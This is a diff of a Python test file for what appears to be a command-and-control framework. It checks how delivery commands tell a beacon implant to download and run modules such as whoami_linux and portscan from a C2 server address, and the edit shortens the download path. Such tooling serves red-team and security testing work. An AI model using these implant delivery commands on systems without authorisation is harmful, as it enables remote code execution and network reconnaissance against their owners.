@@ -62,12 +62,12 @@ class TestClientResolution:
 class TestDeliveryCommand:
     def test_beacon_c_separator_contract(self):
         command = delivery_command("whoami_linux", "https://10.66.44.1:4444")
-        assert command == "bof:https://10.66.44.1:4444/download/bofs/whoami_linux"
+        assert command == "bof:https://10.66.44.1:4444/bof/whoami_linux"
         assert command.count(":") == 3
 
     def test_args_after_space_comma_joined(self):
         command = delivery_command("portscan", "https://10.66.44.1:4444", args=["10.0.0.7", "80", "110"])
-        assert command == "bof:https://10.66.44.1:4444/download/bofs/portscan 10.0.0.7,80,110"
+        assert command == "bof:https://10.66.44.1:4444/bof/portscan 10.0.0.7,80,110"
 
     def test_reject_newline_bof(self):
         with pytest.raises(ValueError):
@@ -130,4 +130,4 @@ class TestRunBof:
         payload = {"lhost": "127.0.0.1", "c2_port": "65534", "c2_user": "x", "c2_pass": "y"}
         result = run_bof("whoami_linux", "beacon01", wait=0, config=cfg, payload=payload)
         assert result["delivered"] is False
-        assert result["command"] == "bof:https://127.0.0.1:65534/download/bofs/whoami_linux"
+        assert result["command"] == "bof:https://127.0.0.1:65534/bof/whoami_linux"
